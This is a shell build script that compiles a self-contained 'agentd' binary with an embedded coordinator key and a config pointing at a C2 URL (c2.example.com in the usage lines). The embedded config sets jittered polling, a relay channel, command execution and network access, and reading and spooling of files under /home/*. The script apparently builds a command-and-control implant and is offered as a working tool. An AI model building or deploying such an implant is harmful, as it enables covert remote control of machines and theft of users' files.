#!/bin/sh
# Builds one self-contained agent binary: config and coordinator key embedded.
#
#   ./build.sh --url https://c2.example.com
#   ./build.sh --url https://c2.example.com --out /tmp/agentd
#
# Defaults read the token and coordinator.pub from the local server state, so run
# this on the box that ran install.sh.
set -eu

url=""; out=./agentd; token=""; pub=""
while [ $# -gt 0 ]; do
  case "$1" in
    --url) url=${2:?}; shift 2 ;;
    --out) out=${2:?}; shift 2 ;;
    --token) token=${2:?}; shift 2 ;;
    --pub) pub=${2:?}; shift 2 ;;
    *) echo "usage: $0 --url URL [--out FILE] [--token TOK] [--pub FILE]" >&2; exit 2 ;;
  esac
done
[ -n "$url" ] || { echo "--url is required" >&2; exit 2; }
src=$(cd "$(dirname "$0")/../.." && pwd)

[ -n "$token" ] || token=$(cat /srv/coord/artifact.token 2>/dev/null || true)
if [ -z "$pub" ]; then
  for candidate in /srv/payload/coordinator.pub /srv/coord/coordinator.pub /root/coordinator.pub; do
    [ -f "$candidate" ] && { pub=$candidate; break; }
  done
fi
[ -n "$token" ] || { echo "no token: --token or /srv/coord/artifact.token" >&2; exit 2; }
[ -n "$pub" ] && [ -f "$pub" ] || { echo "no coordinator.pub: --pub" >&2; exit 2; }
[ "$(wc -c < "$pub")" -eq 32 ] || { echo "$pub must be 32 bytes" >&2; exit 2; }

embed=$(mktemp -d)
trap 'rm -rf "$embed"' EXIT
cat > "$embed/config.toml" <<EOF
poll_interval_s = 30
jitter_percent = 50
channel = "relay"
channel_arg = "$url"
artifact_url = "$url"
artifact_token = "$token"
allow_exec = true
allow_net = true
allow_caps.fs_read = ["/home/*"]
allow_caps.spool = ["/home/*"]
EOF
cp "$pub" "$embed/coordinator.pub"

(cd "$src" && AF_EMBED_DIR="$embed" cargo build --release -p agentd)
install -m 0755 "$src/target/release/agentd" "$out"
echo "built $out"
sha256sum "$out"
echo "run it with: ./$(basename "$out")"
